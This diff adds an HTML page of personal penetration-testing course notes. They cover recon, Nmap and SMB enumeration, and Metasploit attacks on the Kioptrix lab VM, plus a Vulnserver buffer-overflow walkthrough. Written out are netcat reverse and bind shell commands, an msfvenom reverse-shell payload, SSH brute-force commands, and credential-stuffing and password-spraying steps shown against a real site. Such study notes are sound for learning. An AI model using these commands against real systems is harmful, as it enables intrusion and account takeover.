@@ -1,0 +1,353 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Self Notes</title>
+</head><body><span style="font-size: 12pt"># HUNTING SUBDOMAINS (0.00)<br/>
+* Use sublist3r -d tesla.com<br/>
+* Open "crt.sh" in browser, search "%.tesla.com" to hunt for subdomains<br/>
+* OWASP Amass #stated by Heath it’d give more result, but it’s a heavy tool<br/>
+</span><span style="font-size: 12pt">* tomnomnom httprobe #Checks if the subdomain is alive</span><br/>
+<br/>
+<span style="font-size: 12pt">=============================================================================================</span>&nbsp; &nbsp;<span style="font-size: 12pt"><br/>
+</span><span style="font-size: 12pt"><br/>
+</span><span style="font-size: 12pt"># IDENTIFYING WEBSITE TECHNOLOGIES (0.10)</span><br/>
+<span style="font-size: 12pt">*</span>&nbsp;<span style="font-size: 12pt"><a href="http://builtwith.com/tesla.com">builtwith.com/tesla.com</a>&nbsp;sees what tech made the <a href="http://tesla.com">tesla.com</a>&nbsp;website (too detailed tho)<br/>
+</span><span style="font-size: 12pt">* wappalyzer addon show a more general information</span><br/>
+<br/>
+<span style="font-size: 12pt">=============================================================================================</span>&nbsp; &nbsp;<span style="font-size: 12pt"><br/>
+</span><span style="font-size: 12pt"><br/>
+# INFORMATION GATHERING WITH BURP SUITE (0.18)<br/>
+* Open Burp Suite<br/>
+* FIrefox &gt; about:preferences &gt; General &gt; Network Settings &gt; Settngs...<br/>
+* Manual proxy configuration, fill them all with 127.0.0.1 and port 8080. Also no proxy for localhost, 127.0.0.1. Also check SOCKS v5<br/>
+* In Firefox, open https://burp. Download the CA Certificate<br/>
+* FIrefox &gt; about:preferences &gt; Privacy &amp; Security &gt; Certificates &gt; View Certificates... &gt; Import...<br/>
+* Choose the downloaded certificates, check the two checkboxes prompted later.<br/>
+<br/>
+=============================================================================================<br/>
+<br/>
+# GOOGLE FU (0.27)<br/>
+* Search efficiently with Google<br/>
+<br/>
+=============================================================================================<br/>
+<br/>
+# UTILIZING SOCIAL MEDIA (0.32)<br/>
+* Recommended to make dummy account when investigating<br/>
+<br/>
+=============================================================================================<br/>
+<br/>
+# INSTALLING KIOPTRIX (0.38)<br/>
+* Download vulnerable machine (Kioptrix Level 1) on vulnhub.com<br/>
+* Instead, download the TCM version on tcm-sec.com/kioptrix<br/>
+* Run Kioptrix on VMware<br/>
+* login: john password: TwoCows2<br/>
+* scan available devices with arp-scan -l<br/>
+* There is also netdiscover -r &lt;ip_address&gt;<br/>
+<br/>
+=============================================================================================<br/>
+<br/>
+# NMAP (0.49)<br/>
+Three-way Handshake<br/>
+SYN &gt; SYN-ACK &gt; ACK<br/>
+<br/>
+Stealth Scan Nmap (-sS)<br/>
+SYN &gt; SYN-ACK &gt; RST<br/>
+<br/>
+Nmap options:<br/>
+-sS (stealth scan)<br/>
+-T4 (recommended faster scan)<br/>
+-p- (all ports) -p21,80 (only port 21 and 80) (default only scan up to 1000 ports)<br/>
+-A (scan everything in the port)<br/>
+-sN (pingsweep)<br/>
+-sV (scan service/version info)<br/>
+-sU (scan UDP ports, takes longer time)<br/>
+<br/>
+nmap -sU -T4 -p &lt;ip address&gt; (UDP Scan syntax recommendation)<br/>
+nmap -T4 -p- -A &lt;ip address&gt; (personal favourite scan)<br/>
+nikto -h http://&lt;ip address&gt;<br/>
+<br/>
+=============================================================================================<br/>
+<br/>
+# ENUMERATING HTTP/HTTPS (1.04)<br/>
+* Kioptrix's main page shows default page -&gt; shows apache and redhat<br/>
+* Add random directory and it shows default 404 page -&gt; shows server verision: Apache 3.20<br/>
+* use nikto -h http://&lt;ip_address&gt; to get more information<br/>
+* dirbuster to find directories in a machine<br/>
+*(1.20) run dirbuster&amp;, http://&lt;ip_address&gt;:80, add wordlist<br/>
+*(1.24) firefox configuration for Burp Suite and run it<br/>
+* Inspect the default page<br/>
+* Server header information disclosure note<br/>
+<br/>
+=============================================================================================<br/>
+<br/>
+# ENUMERATING SMB (1.34)<br/>
+$ sudo apt install metasploit-framework<br/>
+$ msfconsole<br/>
+msf5 &gt; search smb<br/>
+msf5 &gt; use 60<br/>
+msf5 &gt; use auxiliary/scanner/smb/smb_version<br/>
+msf5 auxiliary(scanner/smb/smb_version) &gt; info<br/>
+msf5 auxiliary(scanner/smb/smb_version) &gt; options<br/>
+* RHOSTS is our target<br/>
+<br/>
+msf5 auxiliary(scanner/smb/smb_version) &gt; set RHOSTS 192.168.57.134<br/>
+msf5 auxiliary(scanner/smb/smb_version) &gt; run<br/>
+result: Unix (Samba 2.2.1a)<br/>
+<br/>
+$ smbclient -L \\\\192.168.57.134\\<br/>
+$ smbclient \\\\192.168.57.134\\ADMIN$<br/>
+$ smbclient \\\\192.168.57.134\\IPC$<br/>
+&gt; help<br/>
+<br/>
+=============================================================================================<br/>
+<br/>
+# ENUMERATING SSH (1.49)<br/>
+$ ssh 192.168.57.134<br/>
+* Unable to negotiate, no matching key exchange method found. Their offer: diffie-hellman-group-sha1<br/>
+<br/>
+$ ssh 192.168.57.134 oKexAlgorithms=+diffie-hellman-group-sha1<br/>
+* No matching cipher found. Their offer: aes128-cbc<br/>
+<br/>
+$ ssh 192.168.57.134 oKexAlgorithms=+diffie-hellman-group-sha1 -c aes128-cbc<br/>
+* Connected to ssh, no need to enter the password<br/>
+* The purpose is looking the banner that may sometimes expose necessary information<br/>
+<br/>
+=============================================================================================<br/>
+<br/>
+# RESEARCHING POTENTIAL VULNERABILITIES (1.53)<br/>
+* So far the noted information<br/>
+"""<br/>
+80/443 - 192.168.57.134 - 10:58pm<br/>
+Default webpage - Apache - PHP<br/>
+Information Disclosure - 404 page<br/>
+Information Disclosure - server headers disclose version information<br/>
+<br/>
+80/tcp open http Apache httpd 1.3.20 ((Unix) (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)<br/>
+<br/>
+mod_ssl/2.8.4 - mod ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell. http://cve.mitre.org/cgi- bin/cvename.cgi?name=CVE-2002-0082, OSVDB-756.<br/>
+<br/>
+SMB<br/>
+Unix (Samba 2.2.1a)<br/>
+<br/>
+Webalizer Version 2.01- http://192.168.57.134/usage/usage_201911.html<br/>
+<br/>
+SSH<br/>
+OpenSSH 2.9p2<br/>
+"""<br/>
+<br/>
+*(1.56) Search exploit on google: mod_ssl 2.8.4 exploit<br/>
+* 80/443 - Found potentially vulnerable to OpenLuck (link)<br/>
+*(2.00) Search Apache httpd 1.3.20 expoit<br/>
+* Search Samba 2.2.1a exploit<br/>
+* 139 - Potentially vulnerable to trans2open (link)<br/>
+<br/>
+* Now trying with searchsploit<br/>
+$ searchsploit Samba 2.2.la<br/>
+no result (search request too detail)<br/>
+$ searchsploit Samba 2<br/>
+$ searchsploit mod ssl 2<br/>
+<br/>
+=============================================================================================<br/>
+<br/>
+# SCANNING WITH NESSUS (2.11)<br/>
+* Download Nessus from Browser<br/>
+* dpkg -i Nessus-Package.deb<br/>
+* start with /etc/init.d/nessusd start<br/>
+*(2.13) Nessus setup<br/>
+*(2.15) Basic scan setup<br/>
+*(2.21) Basic scan ongoing result<br/>
+*(2.22) Sort scan result from severity <br/>
+<br/>
+=============================================================================================<br/>
+<br/>
+# REVERSE SHELLS VS BIND SHELLS (2.28)<br/>
+* Netcat Reverse shell, victim connect to attacker<br/>
+attacker: nc -nvlp 4444 #Listening<br/>
+target: nc 192.168.1.1 4444 -e /bin/bash<br/>
+<br/>
+* Netcat Bind shell, attacker connect to victim<br/>
+target: nc -nvlp 4444 -e /bin/sh #Listening<br/>
+attacker: nc 192.168.1.2 4444<br/>
+<br/>
+*(2.32) Netcat attack simulation<br/>
+<br/>
+=============================================================================================<br/>
+<br/>
+# STAGED VS NON-STAGED PAYLOADS (2.35)<br/>
+* Payload is an exploit<br/>
+* Non-staged: send all shellcode at once, large size<br/>
+windows/meterpreter_reverse_tcp<br/>
+* Staged: send shellcode in stages<br/>
+windows/meterpreter/reverse_tcp<br/>
+<br/>
+=============================================================================================<br/>
+<br/>
+# GAINING ROOT W/ METASPLOIT (2.38)<br/>
+* searchsploit samba 2.2<br/>
+*(2.40) msf5 &gt; search trans2open<br/>
+*(2.41) Start exploit with trans2open via metasploit<br/>
+*(2.42) Bruteforce using trans2open<br/>
+*(2.43) Payload option now available after the previous attack seem failed<br/>
+*(2.44) set payload<br/>
+*(2.45) Run and success<br/>
+<br/>
+=============================================================================================<br/>
+<br/>
+# MANUAL EXPLOITATION (2.46)<br/>
+* Search openluck in Google<br/>
+*(2.47) git clone openfuck<br/>
+*(2.52) Start using openluck<br/>
+*(2.55) try looking for machine's information through the hacked shell<br/>
+*(2.58) Found hashes in /etc/shadows <br/>
+<br/>
+=============================================================================================<br/>
+<br/>
+# BRUTE FORCE ATTACKS (2.59)<br/>
+* Recommended to try brute force attack when see SSH<br/>
+*(3.01) hydra usage example:<br/>
+$ hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt<br/>
+<br/>
+*(3.03) use ssh_login on metasploit<br/>
+$ msfconsole<br/>
+msf5 &gt; search ssh<br/>
+msf5 &gt; use auxiliary/scanner/ssh/ssh login<br/>
+msf5 auxiliary(scanner/ssh/ssh_login) &gt; options<br/>
+msf5 auxiliary(scanner/ssh/ssh_login) &gt; set username root<br/>
+msf5 auxiliary(scanner/ssh/ssh_login) &gt; set pass_file /usr/share/wordlists/metasploit/unix_passwords.txt<br/>
+msf5 auxiliary(scanner/ssh/ssh_login) &gt; set rhosts 192.168.57.134<br/>
+msf5 auxiliary(scanner/ssh/ssh_login) &gt; options<br/>
+msf5 auxiliary(scanner/ssh/ssh_login) &gt; set threads 10<br/>
+msf5 auxiliary(scanner/ssh/ssh_login) &gt; set verbose true<br/>
+msf5 auxiliary(scanner/ssh/ssh_login) &gt; run<br/>
+<br/>
+=============================================================================================<br/>
+<br/>
+# CREDENTIAL STUFFING (3.07)<br/>
+* DON'T TRY TO EXPLOIT TESLA, THIS MODULE IS JUST FOR EXAMPLE<br/>
+* Download foxy proxy addon in firefox<br/>
+* Create a proxy in foxy proxy<br/>
+* Use BurpSuite intercept when login in tesla.com<br/>
+* Mark the email and password input with dollar sign<br/>
+* Stuff the usernames and passwords into the payload<br/>
+* Password spray: use a password to log into different accounts<br/>
+* Look for known usernames and emails on &nbsp;hunter.io, breach-parse from Heath<br/>
+* Spray is attacking active directory account, may cause the account someone is using to be logged out and cause denial of service<br/>
+* Spray is recommended to be done like once after 1 or 2 (or more to be safe, just ask the sites author) &nbsp;hours after the previous attack<br/>
+<br/>
+=============================================================================================<br/>
+<br/>
+# REVISITING NOTES (3.21)<br/>
+<br/>
+=============================================================================================<br/>
+<br/>
+# DOWNLOAD MATERIALS (3.24)<br/>
+* Search windows evaluation in Google<br/>
+* Download windows 10 &nbsp;Enterprise (no need to download when you are already on Windows)<br/>
+* Download The Grey Corner (2010) from Vulnserver<br/>
+* Download and install Immunity Debugger<br/>
+<br/>
+=============================================================================================<br/>
+<br/>
+# BUFFER OVERFLOWS EXPLAINED (3.30)<br/>
+* Steps:<br/>
+1. Spiking<br/>
+2. Fuzzing<br/>
+3. Finding the Offset<br/>
+4. Overwriting the EIP<br/>
+5. Finding Bad Characters<br/>
+6. Finding the Right Module<br/>
+7. Generating Shellcode<br/>
+8. Gain Root Access<br/>
+<br/>
+=============================================================================================<br/>
+<br/>
+# SPIKING (3.34)<br/>
+* Disable Windows Security<br/>
+* Run the vulnserver downloaded previously as administrator<br/>
+* Start Immunity Debugger as administrator<br/>
+* Connect to the target via netcat on Kali (port 9999) to show valid commands: nc -nv &lt;windows_ip&gt; 9999<br/>
+* Overflow the valid commands shown after connecting to the target via netcat. If it crash, it's vulnerable<br/>
+* Install generic_send_tcp sudo apt install spike<br/>
+* gedit stats.spk<br/>
+* inputting random strings to crash the program<br/>
+* generic_send_tcp 192.168.1.8 9999 STATS.spk 0 0<br/>
+*(3.42) gedit trun.spk<br/>
+* Vulnserver crash, held by Immunity Debugger<br/>
+* EIP is important<br/>
+<br/>
+=============================================================================================<br/>
+<br/>
+# FUZZING (3.44)<br/>
+* Continuing the process from previous module<br/>
+* Create a python script and run it<br/>
+* Controlling the EIP value is the most important<br/>
+<br/>
+=============================================================================================<br/>
+<br/>
+# FINDING THE OFFSET (3.51)<br/>
+* /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000 to createa string with 3000 bytes size<br/>
+* Edit the python script to bring the string inside it<br/>
+* Copy the EIP code /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 3000 -q &lt;EIP&gt;<br/>
+* Exact bytes will be found<br/>
+<br/>
+=============================================================================================<br/>
+<br/>
+# OVERWRITING THE EIP (3.56)<br/>
+* Edit the python script to bring a string with 2003 bytes size + 4 characters to overwrite the EIP (A is 41, B is 42)<br/>
+* Execute the script, EBP will be filled with 41 and EIP will be filled with 42 in Immunity Debugger<br/>
+* EIP filled with 42 means we succeeded to overwrite the EIP\<br/>
+<br/>
+=============================================================================================<br/>
+<br/>
+# FINDING BAD CHARACTERS (4.00)<br/>
+* Search badchars on google<br/>
+* Inside the github link, there's a string variable filled with badchars, copy and paste it to your current script<br/>
+* As usual, execute the python script.<br/>
+* highlight ESP code &gt; Follow in Dump<br/>
+* Look at the hex dump, check if there's any unusual pattern <br/>
+<br/>
+=============================================================================================<br/>
+<br/>
+# FINDING THE RIGHT MODULE AND JUMPCODE (4.07)<br/>
+* (https://github.com/corelan/mona/blob/master/mona.py) mona.py copy it to ImmunityDebugger Pycommand folder<br/>
+* locate nasm_shell.rb and use it<br/>
+* nasm.&gt; JMP ESP #search for jumpcode?<br/>
+* Result comes out is FFE4<br/>
+* ImmunityDebugger comand line: !mona modules<br/>
+* Focus on the row where all security permiters are false<br/>
+* !mona find -s "\xff\xe4" -m essfunc.dll # \xff\xe4 is based on FFE4 and essfunc.dll from the row where all security perimeters are false.<br/>
+* In the row where all security permiters are all false (first row). There's a code we need to focus on: 0x625011af<br/>
+* Edit the python code, after the buffer overflower, Replace the badchars with "\xaf\x11\x50\x62" (based on the 0x625011af but reversed) (4.13)<br/>
+* Run the python script, now there's EIP 625011af. Which is the jumpcode.<br/>
+<br/>
+=============================================================================================<br/>
+<br/>
+# GENERATING SHELLCODE &amp; GAINING ROOT (4.16)<br/>
+* msfvenom -p windows/shell_reverse_tcp LHOST=&lt;ip_kali&gt; LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00"<br/>
+* -p = payload, -f = file, -a = architecture, -b = bad character<br/>
+* Payload size is important<br/>
+* Copy the badchars<br/>
+* Edit the python script, paste the generated badchars to a variable called "overflow" and add it into a shellcode (next to jumpcode)<br/>
+* Add the padding after the jumpcode<br/>
+* Save the script<br/>
+* Run netcat listening on port 4444: nc -nvlp 4444<br/>
+* Run the python script<br/>
+* nc gains root on vulnserver<br/>
+<br/>
+=============================================================================================<br/>
+<br/>
+# PYTHON3 AND MORE (4.22)<br/>
+* Update from the previous module where still using python2<br/>
+* The first script in the fuzzing stage. Using python3 and payload need to be encoded first before send<br/>
+* The few next scripts also only need minor edits<br/>
+*(4.27) Create new folder using mona in Immunity Debugger: !mona config -set workingfolder d:\mona<br/>
+* Generate badchars in the previous made folder using mona: !mona bytearray -cpb "\x00"<br/>
+* -cpb "\x00" is for drop the "\x00" out of the badchars list. You can also simpy use: !mona bytearray<br/>
+* Run the last python script<br/>
+* Instead of "Follow in Dump" on the ESP and look for badchars manually, use: !mona compare -f d:\mona\bytearray.bin -a &lt;ESP_value&gt;<br/>
+* Found the possible bad character in the memory comparison result<br/>
+* Find the modules needed (where all security perimeters row are false): !mona modules <br/>
+* Find the jumpcode with: !mona jmp -r ESP -m "essfunc.dll"<br/>
+* Last script, badchars are generated from msfvenom.<br/>
+* Since sometimes payload.encode() doesn't always work. We encode the payload one by one manually.by adding "b" in the beginning of every line in the payload</span></body></html>
